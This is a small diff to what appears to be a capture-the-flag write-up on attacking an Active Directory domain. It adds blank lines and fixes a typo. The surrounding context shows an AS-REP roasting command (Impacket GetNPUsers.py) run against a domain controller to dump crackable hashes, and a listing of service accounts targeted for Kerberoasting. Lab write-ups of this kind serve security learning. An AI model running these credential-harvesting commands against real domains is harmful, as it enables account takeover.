@@ -213,6 +213,8 @@ LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
 
 ntuser.ini in the ytbob317 reads as \ufffd\ufffd
 
+
+
 root@ip-10-201-48-39:~# GetNPUsers.py SOUPEDECODE.LOCAL/ -dc-ip 10.201.9.75 -usersfile users.txt -format hashcat -outputfile hashes.txt
 
 root@ip-10-201-48-39:~# cat hashes.txt
@@ -247,4 +249,4 @@ HTTPS/MonitoringServer  monitoring_svc            2024-06-17 18:29:18.511871  <n
 
 [-] CCache file is not found. Skipping...
 
-this should give us hashes to these services listed aboce
+this should give us hashes to these services listed above
